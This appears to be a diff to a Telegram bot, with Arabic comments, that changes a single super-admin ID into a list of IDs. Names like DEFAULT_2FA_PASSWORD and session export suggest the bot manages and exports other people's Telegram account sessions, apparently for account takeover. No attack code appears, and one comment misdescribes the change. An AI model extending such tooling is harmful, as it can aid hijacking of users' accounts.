@@ -17,7 +17,7 @@ from config import (
     SESSION_RECOVERY_DELAY,
     SESSION_RECOVERY_MAX_ATTEMPTS,
     SESSION_RECOVERY_RETRY_DELAY,
-    SUPER_ADMIN_ID,
+    SUPER_ADMIN_IDS,
     DEFAULT_2FA_PASSWORD,
 )
 import database
@@ -76,16 +76,16 @@ def is_admin(uid: int) -> bool:
 
 
 def is_super_admin(uid: int) -> bool:
-    return uid == SUPER_ADMIN_ID
+    return uid in SUPER_ADMIN_IDS
 
 
 async def _sessions_for_admin(uid: int):
-    return await database.get_sessions_for_admin(uid, SUPER_ADMIN_ID)
+    return await database.get_sessions_for_admin(uid, SUPER_ADMIN_IDS)
 
 
 async def _guard_session(callback: CallbackQuery, phone: str) -> bool:
     if not await database.can_admin_access_session(
-        callback.from_user.id, phone, SUPER_ADMIN_ID
+        callback.from_user.id, phone, SUPER_ADMIN_IDS
     ):
         await callback.answer("❌ هذا الحساب غير متاح.", show_alert=True)
         return False
@@ -179,8 +179,8 @@ async def _export_session_message(callback: CallbackQuery, session):
 
 
 async def _admin_panel_text(uid: int) -> str:
-    count = await database.get_sessions_count(uid, SUPER_ADMIN_ID)
-    invalid = await database.count_invalid_sessions(uid, SUPER_ADMIN_ID)
+    count = await database.get_sessions_count(uid, SUPER_ADMIN_IDS)
+    invalid = await database.count_invalid_sessions(uid, SUPER_ADMIN_IDS)
     lines = [
         "👋 أهلاً بالقيادة!",
         f"🤖 معرف البوت: <code>{BOT_ID}</code>",
@@ -207,7 +207,7 @@ async def track_admin_phone_message(
     admin_id: int, phone: str, chat_id: int, message_id: int
 ):
     """تسجيل رسالة بوت مرتبطة برقم — لحذفها لاحقاً عند ⭐."""
-    if not phone or admin_id == SUPER_ADMIN_ID:
+    if not phone or admin_id in SUPER_ADMIN_IDS:
         return
     norm = database.normalize_phone(phone)
     await database.save_admin_notification(
@@ -216,9 +216,10 @@ async def track_admin_phone_message(
 
 
 async def purge_phone_from_other_admins(phone: str) -> int:
-    """حذف كل رسائل البوت عن هذا الرقم من شاتات الأدمنة (ما عدا A1)."""
+    """حذف كل رسائل البوت عن هذا الرقم من شاتات الأدمنة (ما عدا السوبر أدمنز)."""
+    # نمرر SUPER_ADMIN_ID الأول كـ fallback للقاعدة، ولكن المنطق هنا يتعامل مع القائمة
     notifs = await database.get_admin_notifications_for_phone(
-        phone, except_admin=SUPER_ADMIN_ID
+        phone, except_admin=SUPER_ADMIN_IDS
     )
     by_chat: dict[int, list[int]] = {}
     for n in notifs:
